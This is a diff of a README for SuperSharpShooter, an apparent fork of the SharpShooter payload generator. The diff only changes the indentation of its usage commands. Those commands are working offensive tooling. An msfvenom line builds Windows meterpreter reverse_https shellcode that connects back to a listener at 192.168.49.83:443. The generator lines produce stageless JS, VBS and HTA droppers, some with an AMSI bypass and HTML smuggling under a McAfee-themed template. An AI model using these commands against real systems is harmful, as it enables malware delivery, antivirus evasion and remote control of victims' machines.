@@ -14,18 +14,23 @@ I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi b
     msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > csharpsc.txt  ### you'll need to remove all variable wrapping such that only the bytes remain
 
 ### Core stageless
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test
+    ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
+
+	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test
+
+	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test
 
 ### Core with AMSI bypass
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test --amsi amsienable
+    ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable
+
+	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable
+
+	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload hta --output test --amsi amsienable
 
 ### Core with AMSI Bypass and HTML Smuggling
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable --smuggle --template mcafee
-./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable --smuggle --template mcafee
+    ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test --amsi amsienable --smuggle --template mcafee
+
+	./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload vbs --output test --amsi amsienable --smuggle --template mcafee
 
 
 Big ups MDSec!
